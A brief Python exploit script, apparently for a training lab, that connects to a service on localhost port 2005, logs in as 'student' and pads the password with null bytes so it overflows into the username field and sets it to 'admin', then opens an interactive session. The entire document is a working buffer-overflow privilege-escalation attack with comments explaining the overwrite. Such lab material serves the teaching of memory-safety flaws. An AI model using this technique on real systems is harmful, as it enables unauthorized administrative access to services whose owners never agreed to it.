#!/usr/bin/python3

import socket
import telnetlib

s = socket.create_connection(('localhost', 2005))

username = b'student\n'
s.send(username)

password = b'student' + b'\x00'*9 # Overwrite the password field
password += b'admin' # Change the username to admin
password += b'\n'
s.send(password)

t = telnetlib.Telnet()
t.sock = s
t.interact()



s.close()
